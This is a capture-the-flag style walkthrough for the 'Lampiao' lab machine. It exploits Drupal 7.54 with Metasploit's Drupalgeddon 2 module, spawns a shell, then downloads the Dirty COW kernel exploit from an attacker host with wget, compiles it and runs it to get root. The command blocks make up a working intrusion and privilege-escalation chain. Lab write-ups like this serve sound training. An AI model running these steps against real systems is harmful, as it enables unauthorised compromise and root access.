# Lampiao

**IP Address:** 192.168.76.48

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 22    | ssh      | OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) |
| 80    | http     |  |
| 1898  | http     | Drupal 7.54 |


## Exploitation
### Exploit Details (Metasploit)
* **Name** - Drupal Drupalgeddon 2 Forms API Property Injection
* **CVE** - CVE-2018-7600
* **Module** - exploit/unix/webapp/drupal_drupalgeddon2
* **Disclosed** - 2018-03-28
* **References**
  * https://cvedetails.com/cve/CVE-2018-7600/
  * https://www.drupal.org/sa-core-2018-002
  * https://greysec.net/showthread.php?tid=2912
  * https://research.checkpoint.com/uncovering-drupalgeddon-2/
  * https://github.com/a2u/CVE-2018-7600
  * https://github.com/nixawk/labs/issues/19
  * https://github.com/FireFart/CVE-2018-7600

### Process

**Set Metasploit Options**

![Execute Exploit](images/exploit1.png)

**Execute Exploit**

Commands
```
run
shell
python -c 'import pty;pty.spawn("/bin/bash")'
whoami
cat /home/tiago/local.txt
ifconfig
```

![Execute Exploit](images/exploit2.png)

## Privilege Escalation
### Exploit Details (SearchSploit)
* **Name** - Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method) 
* **CVE** - 2016-5195
* **Exploit** - linux/local/40847.cpp
* **Disclosed** - 2016-11-27
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2016-5195

Commands
```bash
export lhost=192.168.49.76
wget http://$lhost/linux/exploits/kernel/40847.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow 40847.cpp -lutil
chmod 777 dirtycow
./dirtycow
su
dirtyCowFun
whoami
cat /root/proof.txt
ifconfig
```

![Execute Exploit](images/privesc1.png)

![Execute Exploit](images/privesc2.png)
